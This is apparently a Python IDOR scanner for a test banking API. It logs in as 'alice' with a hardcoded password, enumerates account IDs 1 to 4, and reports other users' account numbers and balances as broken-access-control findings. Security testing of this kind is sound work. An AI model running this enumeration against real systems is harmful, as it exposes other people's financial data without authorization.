import requests
from datetime import datetime

def get_token(base_url, username="alice", password="alice1234"):
    resp = requests.post(f"{base_url}/auth/login", json={
        "username": username, "password": password
    })
    if resp.status_code == 200:
        return resp.json()["access_token"]
    raise Exception(f"로그인 실패: {resp.text}")

def idor_check(base_url):
    result = {
        "scan_id": "IDOR",
        "target": base_url,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": []
    }

    try:
        token = get_token(base_url)
    except Exception as e:
        result["error"] = str(e)
        return result

    headers = {"Authorization": f"Bearer {token}"}

    my_resp = requests.get(f"{base_url}/accounts/my", headers=headers)
    my_ids = [a["id"] for a in my_resp.json()]

    for account_id in range(1, 5):
        resp = requests.get(f"{base_url}/accounts",
            params={"id": account_id}, headers=headers)

        if resp.status_code == 200:
            data = resp.json()
            is_mine = account_id in my_ids

            if not is_mine:
                result["vulnerabilities"].append({
                    "id": f"IDOR-{account_id:03d}",
                    "type": "IDOR",
                    "severity": "High",
                    "status": "취약",
                    "owasp": "A01:2021 - Broken Access Control",
                    "endpoint": f"/accounts?id={account_id}",
                    "payload": f"id={account_id}",
                    "detected_keywords": ["account_number", "balance"],
                    "evidence": f"타인 계좌 조회 성공 - 계좌번호: {data.get('account_number')}, 잔액: {data.get('balance')}",
                    "description": f"alice 계정으로 id={account_id} 타인 계좌 무단 조회 — 소유자 검증 없음"
                })

    return result